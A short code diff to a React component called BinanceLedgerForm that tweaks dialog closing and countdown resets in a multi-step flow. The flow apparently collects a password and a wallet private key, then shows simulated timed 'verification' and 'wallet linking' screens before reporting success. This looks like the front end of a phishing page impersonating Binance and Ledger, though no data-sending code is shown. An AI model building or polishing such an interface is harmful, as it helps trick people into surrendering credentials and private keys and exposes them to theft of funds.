@@ -120,6 +120,8 @@ const BinanceLedgerForm: FC = () => {
         setTimerCount(timerCount - 1);
       }, 1000);
     } else if (currentStep === FormStep.APP_VERIFICATION && timerCount === 0) {
+      // Close the verification dialog and move to login success
+      setShowVerificationDialog(false);
       setCurrentStep(FormStep.LOGIN_SUCCESS);
       setTimerCount(10); // Reset for next timer
       toast({
@@ -133,6 +135,7 @@ const BinanceLedgerForm: FC = () => {
         setTimerCount(timerCount - 1);
       }, 1000);
     } else if (currentStep === FormStep.WALLET_LINKING && timerCount === 0) {
+      setShowLinkingDialog(false);
       setCurrentStep(FormStep.WALLET_SUCCESS);
     }
     
@@ -284,6 +287,7 @@ const BinanceLedgerForm: FC = () => {
         if (validatePassword()) {
           setShowVerificationDialog(true);
           setCurrentStep(FormStep.APP_VERIFICATION);
+          setTimerCount(10); // Reset timer when starting verification
         }
         break;
         
@@ -350,6 +354,7 @@ const BinanceLedgerForm: FC = () => {
         if (validatePrivateKey()) {
           setShowLinkingDialog(true);
           setCurrentStep(FormStep.WALLET_LINKING);
+          setTimerCount(10); // Reset timer when starting linking
         }
         break;
         
